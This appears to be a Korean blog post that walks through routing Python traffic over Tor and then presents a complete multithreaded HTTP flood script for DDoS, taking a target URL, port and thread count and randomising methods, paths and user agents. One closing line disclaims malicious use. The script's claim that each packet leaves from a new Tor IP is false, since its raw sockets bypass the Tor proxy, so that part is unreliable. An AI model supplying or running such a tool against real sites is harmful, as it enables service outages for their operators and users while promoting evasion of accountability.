---
layout: single
title:  "tor 활용해서 ip 숨기고 디도스 날리기"
categories: "Secure"
tag: "Secure"
toc: true
author_profile: false
sidebar:
    nav: "docs"
---
# IP를 숨기고 디도스 날려보자 
앞선 방법들로 내가 어떤 기기에서 날리는지 모르게 하더라도, IP가 들켜버리니 말장 도루묵이다.  
따라서, tor 라는 내 IP를 숨겨주는 브라우저를 활용해 디도슬르 날리는 것으로 내 IP를 숨길 수 있다.  
이는 토어 네트워크를 이용하여 파이썬 코드의 모든 요청을 라우팅하는 것으로 할 수 있다.   
이를 위해 `stem` 라이브러리를 사용하여 파이썬 코드에서 토어 네트워크를 제어하고, `requests` 라이브러리를 사용하여 HTTP 요청을 보낼 수 있다.  


1. **토어 설치**:
   - [https://www.torproject.org/download](https://www.torproject.org/download/)
   위에 저거 다운 받자

2. **Tor 서비스 시작**:
   - 토어 브라우저한번 실행해 보자. 속도가 다른 브라우져보다 느릴텐데, 이는 많은 우회 과정을 거치기 때문이다.  

3. **stem 및 requests 라이브러리 설치**:
   - 파이썬 코드에서 Tor를 제어하기 위해 `stem` 라이브러리와 HTTP 요청을 보내기 위해 `requests` 라이브러리를 설치하자.  
   ```bash
   pip install stem requests
   ```  

4. **Tor를 통한 HTTP 요청 설정**:
- 다음은 토어 네트워크를 통해 IP를 숨기고 HTTP 요청을 보내는 예제 코드이다:  
```python
import requests
from stem import Signal
from stem.control import Controller

# Tor 컨트롤러를 통해 새로운 Tor 회로를 요청하는 함수
def renew_tor_ip():
   with Controller.from_port(port=9051) as controller:
       controller.authenticate(password='your_password')  # Tor 설정에서 설정한 비밀번호 사용
       controller.signal(Signal.NEWNYM)

# Tor를 사용하여 HTTP 요청을 보내는 함수
def get(url):
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    response = session.get(url)
    return response

# Tor IP 갱신
renew_tor_ip()

# 예제 HTTP 요청
url = 'http://httpbin.org/ip'
response = get(url)
print(response.text)
```

### 설명
1. **Tor 서비스 시작**:
   - Tor 브라우저를 실행하거나, Tor 서비스만 실행합니다. 서비스만 실행하려면 `tor` 명령을 사용할 수 있습니다.
2. **`stem` 라이브러리를 사용하여 Tor 회로 갱신**:
   - `stem` 라이브러리를 사용하여 새로운 Tor 회로를 요청하고 IP를 갱신합니다.
   - Tor의 제어 포트에 연결하여 새로운 회로를 생성하도록 신호를 보냅니다.
3. **`requests` 라이브러리를 사용하여 HTTP 요청**:
   - `requests` 라이브러리의 프록시 설정을 통해 모든 HTTP 요청을 Tor 네트워크를 통해 라우팅합니다.
   - `socks5h://127.0.0.1:9050`는 로컬에서 실행 중인 Tor 프록시 서버의 주소입니다.

위 코드로 Tor 네트워크를 통해 HTTP 요청을 보내고 응답을 받을 수 있다.  
필요한 경우 `renew_tor_ip` 함수를 호출하여 IP를 갱신할 수 도 있다.  
Tor 제어 포트에 대한 접근 권한이 필요하며, 이를 위해 `torrc` 파일에서 `ControlPort`와 `HashedControlPassword` 설정을 확인해야 한다.  

추가적으로, Tor 설정 파일 (`torrc`)에서 제어 포트를 설정하고 비밀번호를 설정해야 한다:  
```
ControlPort 9051
HashedControlPassword your_hashed_password
```

이렇게 하면 파이썬 코드를 Tor 네트워크를 통해 실행하고 IP를 숨길 수 있다.  
위와 같은 방식을 디도스에 적용해 보자.  
```python
import re
import os
import sys
import time
import string
import signal
import http.client
import urllib.parse
import requests
from stem import Signal
from stem.control import Controller
from random import choice, randint
from socket import *
from threading import Thread
from argparse import ArgumentParser, RawTextHelpFormatter

version = '3.1'

# 사용자 입력 처리
def get_args():
    parser = ArgumentParser(formatter_class=RawTextHelpFormatter)
    parser.add_argument("-u", "--url", required=True, help="공격할 URL을 입력하십시오.")
    parser.add_argument("-p", "--port", default=80, type=int, help="공격할 포트 번호 (기본값: 80)")
    parser.add_argument("-t", "--threads", default=100, type=int, help="스레드 수 (기본값: 100)")
    parser.add_argument("-s", "--sleep", default=0, type=float, help="스레드 간 대기 시간 (초, 기본값: 0)")
    return parser.parse_args()

# Tor 컨트롤러를 통해 새로운 Tor 회로를 요청하는 함수
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')  # Tor 설정에서 설정한 비밀번호 사용
        controller.signal(Signal.NEWNYM)

# Tor를 사용하여 HTTP 요청을 보내는 함수
def get(url):
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    response = session.get(url)
    return response

# 패킷 전송 방식 고도화 클래스
class AdvancedPyslow:
    def __init__(self, tgt, port, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']  # 다양한 HTTP 메소드
        self.user_agents = self.load_user_agents()  # User-Agent 목록 불러오기

    def load_user_agents(self):
        try:
            with open("./ua.txt", "r") as fp:
                return re.findall(r"(.+)\n", fp.read())
        except FileNotFoundError:
            print('[-] \'ua.txt\' 파일을 찾을 수 없습니다.')
            return []

    # 패킷 생성 함수
    def create_packet(self):
        method = choice(self.method)
        path = '/' + str(randint(1, 999999999))
        user_agent = choice(self.user_agents)
        return f"{method} {path} HTTP/1.1\r\nHost: {self.tgt}\r\nUser-Agent: {user_agent}\r\n\r\n"

    # 패킷 전송 함수
    def send_packet(self):
        try:
            # Tor IP 갱신
            renew_tor_ip()
            # 새로운 Tor IP를 통해 요청 전송
            with socket(AF_INET, SOCK_STREAM) as sock:
                sock.connect((self.tgt, self.port))
                packet = self.create_packet()
                sock.sendall(packet.encode())
                print(f"[+] 패킷 전송: {packet.strip()}")
        except Exception as e:
            print(f"[-] 패킷 전송 실패: {e}")

    # 스레드 실행 함수
    def run(self):
        threads = []
        for _ in range(self.threads):
            t = Thread(target=self.send_packet)
            t.start()
            threads.append(t)
            time.sleep(self.sleep)  # 스레드 간 대기 시간

        for t in threads:
            t.join()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal.SIG_DFL)  # Ctrl+C 시 기본 시그널 처리
    args = get_args()
    target_ip = gethostbyname(args.url)  # 도메인에서 IP 주소 얻기
    print(f"[+] 공격 대상: {args.url} ({target_ip})")
    
    # 패킷 전송 고도화 클래스 인스턴스 생성 및 실행
    attack = AdvancedPyslow(target_ip, args.port, args.threads, args.sleep)
    attack.run()

```

위와 같은 방법으로, 패킷을 보낼 때 마다 다른 IP에서 날리는 것으로 만들 수 있다.  
이건 개념 이해 목적이므로, 절대 악의성을 가지고 남을 공격하는데 사용하지 말자.  